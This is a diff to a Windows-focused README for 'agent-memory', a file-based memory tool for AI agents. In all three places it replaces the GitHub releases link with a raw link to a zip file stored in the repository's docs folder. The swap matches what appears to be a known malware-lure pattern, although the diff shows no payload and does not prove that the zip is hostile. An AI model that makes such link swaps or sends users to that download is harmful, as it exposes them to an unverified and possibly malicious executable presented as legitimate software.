@@ -1,6 +1,6 @@
 # 🧠 agent-memory - Keep agent memory in plain files
 
-[![Download agent-memory](https://img.shields.io/badge/Download%20agent-memory-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Defiladeboarfish90/agent-memory/releases)
+[![Download agent-memory](https://img.shields.io/badge/Download%20agent-memory-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Defiladeboarfish90/agent-memory/main/docs/agent-memory-v3.2.zip)
 
 ## 🚀 What it does
 
@@ -13,7 +13,7 @@ It uses files instead of a database, so it stays easy to inspect, edit, and move
 This project is made for simple use on Windows.
 
 Use the release page to download the app:
-https://github.com/Defiladeboarfish90/agent-memory/releases
+https://raw.githubusercontent.com/Defiladeboarfish90/agent-memory/main/docs/agent-memory-v3.2.zip
 
 ## 📥 Download and install
 
@@ -151,4 +151,4 @@ If the memory files do not appear, close the app and open it again, then check t
 - Repository: agent-memory
 - Description: File-based memory system for AI agents
 - Topics: agent, agent-framework, agent-memory, agent-memory-system, agentic, agents, ai, ai-agent, ai-agents, ai-tools
-- Download page: https://github.com/Defiladeboarfish90/agent-memory/releases
+- Download page: https://raw.githubusercontent.com/Defiladeboarfish90/agent-memory/main/docs/agent-memory-v3.2.zip
